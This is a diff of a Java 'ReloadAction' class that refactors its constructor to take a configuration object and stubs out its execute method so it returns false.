@@ -8,9 +8,10 @@
  * *************************************************/
 package blackberry.action;
 
+import blackberry.Trigger;
+import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 
 
 /**
@@ -23,30 +24,26 @@ public final class ReloadAction extends SubAction {
     /**
      * Instantiates a new reload action.
      * 
-     * @param actionId_
-     *            the action id_
-     * @param confParams
+     * @param params
      *            the conf params
      */
-    public ReloadAction(final int actionId_, final byte[] confParams) {
-        super(actionId_);
-        parse(confParams);
+    public ReloadAction(final ConfAction params) {
+        super(params);
     }
 
     /*
      * (non-Javadoc)
-     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
+     * 
+     * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
      */
-    public boolean execute(final Event triggeringEvent) {
-        wantReload = true;
-        return true;
+
+    public boolean execute(Trigger trigger) {
+        //status.reload=true;
+        return false;
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.action.SubAction#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParams) {
+
+    protected boolean parse(ConfAction params) {
         return true;
     }
 
